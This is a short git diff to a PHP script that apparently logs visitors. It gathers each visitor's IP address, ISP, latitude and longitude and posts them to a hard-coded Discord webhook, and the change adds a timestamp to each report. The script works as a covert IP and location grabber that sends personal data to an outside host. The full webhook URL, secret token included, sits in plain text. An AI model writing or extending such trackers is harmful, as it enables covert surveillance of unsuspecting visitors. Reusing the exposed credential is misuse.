@@ -35,6 +35,7 @@ $LAT = $data->lat;
 $LON = $data->lon;
 $IP = $data->query;
 $ISP = $data->isp;
+$TIMESTAMP = date("Y/m/d || h:ia + s");
 
 $url = "https://discord.com/api/webhooks/945402624633610280/3pYLhfzPZAdZgDBVBYYRUMkBIiRbVFLl6JXp3ftzdVksbJTtjtG8sPrX02VzJsrFRAIJ";
 $headers = [ 'Content-Type: application/json; charset=utf-8' ];
@@ -72,6 +73,11 @@ $POST = [
                 [
                     "name" => "ISP: ",
                     "value" => "$ISP",
+                    "inline" => false
+                ],
+                [
+                    "name" => "Date: ",
+                    "value" => "$TIMESTAMP seconds",
                     "inline" => false
                 ]
             ]
